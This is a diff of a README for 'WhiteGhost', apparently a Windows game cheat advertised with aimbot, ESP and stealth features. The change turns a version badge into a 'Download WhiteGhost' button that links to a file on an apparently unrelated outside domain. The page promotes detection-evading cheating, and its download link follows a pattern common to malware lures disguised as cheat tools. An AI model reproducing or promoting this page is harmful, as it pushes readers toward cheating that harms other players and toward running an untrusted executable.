@@ -4,7 +4,7 @@
 
 **Monochrome UI · Precise Aiming · Stealth Focused · Advanced ESP**
 
-[![Download WhiteGhost](https://img.shields.io/badge/WhiteGhost-v2.8.4-black?style=flat-square&logo=windows&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download WhiteGhost](https://img.shields.io/badge/Download%20WhiteGhost-v2.8.4-black?style=flat-square&logo=windows&logoColor=white)](https://shanxisaide.com/s/file)
 
 ![Version](https://img.shields.io/badge/v2.8.4-STABLE-000000?style=flat-square)
 ![Platform](https://img.shields.io/badge/WIN-10_%7C_11-333333?style=flat-square&logo=windows&logoColor=white)
